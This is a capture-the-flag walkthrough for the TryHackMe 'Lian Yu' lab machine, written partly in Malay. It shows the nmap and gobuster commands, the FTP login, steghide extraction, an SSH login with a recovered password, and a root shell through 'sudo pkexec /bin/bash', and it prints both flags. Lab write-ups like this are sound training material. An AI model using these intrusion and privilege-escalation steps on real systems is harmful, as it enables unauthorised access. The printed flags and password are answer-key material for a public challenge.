# 🏝️ Lian Yu – TryHackMe Walkthrough (FULL DETAILED REPORT)

![Banner](https://i.imgur.com/your-banner-image.png)

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Type](https://img.shields.io/badge/Type-CTF-blue)
![Focus](https://img.shields.io/badge/Focus-Enumeration%20%7C%20FTP%20%7C%20Stego%20%7C%20PrivEsc-purple)

---

# 🧠 1. Reconnaissance Phase

## 🔍 Step 1: Nmap Scan

Aku mula dengan scanning target untuk detect service yang running.

```bash
nmap -sC -sV -A 10.48.137.137
📌 Purpose:
-sC → run default scripts
-sV → detect service version
-A → aggressive scan (OS + traceroute + scripts)
📊 Results
Open Ports:
Port	Service	Version
21	FTP	vsftpd 3.0.2
22	SSH	OpenSSH 6.7p1
80	HTTP	Apache (Purgatory page)
111	rpcbind	Linux RPC
🧠 Analysis:
FTP available → possible file leakage
Web server → directory enumeration needed
SSH → potential final access
rpcbind → usually noise but sometimes attack surface
🌐 2. Web Enumeration Phase
🔍 Step 2: Gobuster Directory Scan

Aku scan hidden directories pada web server.

gobuster dir -u http://10.48.137.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
📌 Result Found:
/island
/server-status (403 Forbidden)
🧠 Analysis:
/island looks like main attack surface
/server-status blocked → Apache config protected
🌐 3. Deep Web Enumeration
🔍 Step 3: Explore /island

Aku browse manually dan jumpa struktur lain.

Then aku fuzz deeper:

/island/2100
📌 Hidden File Found:
/green_arrow.ticket
🧠 Analysis:
“2100” looks like key parameter / directory
“ticket” suggests credential or access token file
📂 4. FTP Enumeration Phase
🔐 Step 4: Connect FTP
ftp 10.48.165.72

Login:

Username: vigilante
Password: (provided/guessed from challenge context)
📁 Step 5: Directory Listing
ls -la
Files discovered:
Leave_me_alone.png
Queen's_Gambit.png
aa.jpg
.other_user (hidden file)
.bash_history (restricted)
🧠 Analysis:
Images → likely steganography
.other_user → very important hidden credential file
.bash_history → possible command leakage (but restricted)
📥 Step 6: Download All Files
mget *
Purpose:

Pull all files locally for offline analysis.

🕵️ 5. Hidden Data Analysis
📄 Step 7: Read hidden file
cat .other_user
📌 Output Insight:

We get a full Deathstroke lore story:

Slade Wilson background
Military history
Family conflict
🧠 Important Finding:
“Slade” = SSH username hint
“military + experiment” = password clue direction
🧩 6. Steganography Phase
🖼️ Step 8: Extract hidden file from image

I tested images using steghide.

steghide --extract -sf aa.jpg
🔐 Passphrase:

(Not directly given — derived from hints)

📦 Output:
ss.zip
📂 Step 9: Extract ZIP file
unzip ss.zip
Files extracted:
passwd.txt
shado
📄 Step 10: Analyze extracted files
passwd.txt

Just lore + hint text (no direct password)

shado file:
cat shado
📌 Result:
M3tahuman
🧠 Analysis:
This is likely SSH password
Looks like modified spelling → intentional CTF password
🔑 7. SSH Access Phase
🔐 Step 11: Login via SSH
ssh slade@10.48.137.137
Password used:
M3tahuman
🎯 Result:

✔ Successful login as slade

👤 8. User Flag
📄 Step 12: Retrieve user flag
cat user.txt
🏁 Output:
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
🧠 Meaning:
Confirms foothold
User-level compromise achieved
⚙️ 9. Privilege Escalation Phase
🔍 Step 13: Check sudo privileges
sudo -l
📌 Output:
(root) PASSWD: /usr/bin/pkexec
🧠 Analysis:
pkexec allowed as root
misconfigured privilege escalation vector
💥 Step 14: Exploit pkexec
sudo -u root /usr/bin/pkexec /bin/bash
🎯 Result:

✔ Root shell obtained

👑 10. Root Flag
📄 Step 15: Capture root flag
cat root.txt
🏁 Output:
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
🧾 FINAL SUMMARY
🛠️ Full Attack Chain
Nmap → discover services
Gobuster → find /island
Web fuzzing → find /2100 + ticket
FTP login → retrieve files
Steganography → extract ZIP
Credential discovery → M3tahuman
SSH login → user access
Sudo misconfig → pkexec abuse
Root access → full compromise
💬 CONCLUSION

This machine heavily relies on:

Deep enumeration
Hidden files in FTP
Steganography extraction
Misconfigured sudo privileges

👉 Key lesson:
Even “useless files” often contain the next step in the chain.
